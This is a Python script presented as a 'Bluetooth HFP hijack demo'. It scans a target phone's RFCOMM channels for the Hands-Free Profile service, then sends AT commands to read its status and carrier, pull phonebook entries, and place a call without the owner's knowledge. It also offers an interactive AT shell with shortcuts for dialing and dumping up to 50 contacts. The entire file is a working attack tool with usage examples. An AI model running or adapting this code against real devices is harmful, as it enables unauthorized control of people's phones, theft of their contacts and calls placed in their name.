#!/usr/bin/env python3
"""
Bluetooth HFP Attack Demo
Scans for HFP, connects, and demonstrates unauthorized call
"""
import socket
import sys
import time

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    print(f"{Colors.HEADER}")
    print("=" * 60)
    print("  BLUETOOTH HFP HIJACK DEMO")
    print("  Impersonating Trusted Device to Make Unauthorized Calls")
    print("=" * 60)
    print(f"{Colors.ENDC}\n")

def scan_for_hfp(mac_address):
    """Scan channels 1-30 to find HFP service"""
    print(f"{Colors.OKCYAN}[*] Scanning {mac_address} for HFP channel...{Colors.ENDC}")
    
    for channel in range(1, 31):
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
        sock.settimeout(2)
        
        try:
            sock.connect((mac_address, channel))
            
            # Test if it's HFP by sending AT command
            sock.send(b"AT\r\n")
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            if 'OK' in response or 'ERROR' in response:
                print(f"{Colors.OKGREEN}[+] Found HFP on channel {channel}{Colors.ENDC}")
                sock.close()
                return channel
            
            sock.close()
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    print(f"{Colors.FAIL}[-] HFP channel not found{Colors.ENDC}")
    return None

def send_at_command(sock, cmd, description=""):
    """Send AT command and return response"""
    if description:
        print(f"{Colors.OKCYAN}[*] {description}{Colors.ENDC}")
    
    msg = f"{cmd}\r\n"
    sock.send(msg.encode())
    time.sleep(0.5)
    
    response = sock.recv(4096).decode('utf-8', errors='ignore')
    print(f"{Colors.OKBLUE}{response}{Colors.ENDC}")
    return response

def demo_attack(mac_address, target_number):
    """Main attack demonstration"""
    print_banner()
    
    # Step 1: Scan for HFP
    channel = scan_for_hfp(mac_address)
    if not channel:
        print(f"{Colors.FAIL}[!] Attack failed - no HFP service found{Colors.ENDC}")
        return
    
    # Step 2: Connect to HFP
    print(f"\n{Colors.OKCYAN}[*] Connecting to HFP service...{Colors.ENDC}")
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    
    try:
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}[+] Connected!{Colors.ENDC}\n")
        
        # Step 3: Initialize HFP
        send_at_command(sock, "AT+BRSF=2079", "Initializing HFP features...")
        time.sleep(1)
        
        # Step 4: Get phone status
        print(f"\n{Colors.WARNING}[RECONNAISSANCE]{Colors.ENDC}")
        send_at_command(sock, "AT+CIND?", "Getting phone status...")
        send_at_command(sock, "AT+COPS?", "Getting carrier info...")
        
        # Step 5: Steal contacts
        print(f"\n{Colors.WARNING}[DATA THEFT]{Colors.ENDC}")
        send_at_command(sock, "AT+CPBR=1,10", "Stealing first 10 contacts...")
        
        # Step 6: Make unauthorized call
        print(f"\n{Colors.FAIL}[ATTACK] Making unauthorized call...{Colors.ENDC}")
        print(f"{Colors.BOLD}Target: {target_number}{Colors.ENDC}")
        send_at_command(sock, f"ATD{target_number};", f"Dialing {target_number}...")
        
        print(f"\n{Colors.OKGREEN}[+] Call initiated! Check the victim's phone screen.{Colors.ENDC}")
        
        # Wait then hang up
        print(f"\n{Colors.OKCYAN}[*] Waiting 5 seconds...{Colors.ENDC}")
        time.sleep(5)
        
        send_at_command(sock, "AT+CHUP", "Hanging up...")
        
        print(f"\n{Colors.OKGREEN}[+] Demo complete!{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Victim's phone made a call without their knowledge{Colors.ENDC}")
        
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
    finally:
        sock.close()
        print(f"\n{Colors.OKCYAN}[*] Disconnected{Colors.ENDC}")

def interactive_mode(mac_address, channel):
    """Interactive AT command shell"""
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
    
    try:
        sock.connect((mac_address, channel))
        print(f"{Colors.OKGREEN}Connected to {mac_address} on channel {channel}{Colors.ENDC}")
        print("\nInteractive mode - Quick commands:")
        print("  :dial <number>  - Make a call")
        print("  :hangup        - Hang up call")
        print("  :contacts      - Read phonebook")
        print("  :status        - Get phone status")
        print("  quit           - Exit\n")
        
        while True:
            try:
                cmd = input(f"{Colors.OKCYAN}AT> {Colors.ENDC}")
                
                if cmd.lower() in ['quit', 'exit', 'q']:
                    break
                
                # Handle shortcuts
                if cmd.startswith(':dial '):
                    number = cmd.split(' ', 1)[1]
                    cmd = f"ATD{number};"
                elif cmd == ':hangup':
                    cmd = "AT+CHUP"
                elif cmd == ':contacts':
                    cmd = "AT+CPBR=1,50"
                elif cmd == ':status':
                    cmd = "AT+CIND?"
                
                response = send_at_command(sock, cmd)
                
            except KeyboardInterrupt:
                print("\nExiting...")
                break
                
    except Exception as e:
        print(f"{Colors.FAIL}Error: {e}{Colors.ENDC}")
    finally:
        sock.close()

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Demo mode:        sudo python3 hfp_demo.py <MAC_ADDRESS> <PHONE_NUMBER>")
        print("  Interactive mode: sudo python3 hfp_demo.py <MAC_ADDRESS> -i [channel]")
        print("\nExamples:")
        print("  sudo python3 hfp_demo.py 94:45:60:76:C9:E6 5551234567")
        print("  sudo python3 hfp_demo.py 94:45:60:76:C9:E6 -i")
        print("  sudo python3 hfp_demo.py 94:45:60:76:C9:E6 -i 3")
        sys.exit(1)
    
    mac_address = sys.argv[1]
    
    # Interactive mode
    if len(sys.argv) >= 3 and sys.argv[2] == '-i':
        if len(sys.argv) == 4:
            channel = int(sys.argv[3])
        else:
            channel = scan_for_hfp(mac_address)
            if not channel:
                sys.exit(1)
        interactive_mode(mac_address, channel)
    
    # Demo mode
    elif len(sys.argv) == 3:
        target_number = sys.argv[2]
        demo_attack(mac_address, target_number)
    
    else:
        print("Invalid arguments. Use -h for help")

if __name__ == "__main__":
    main()
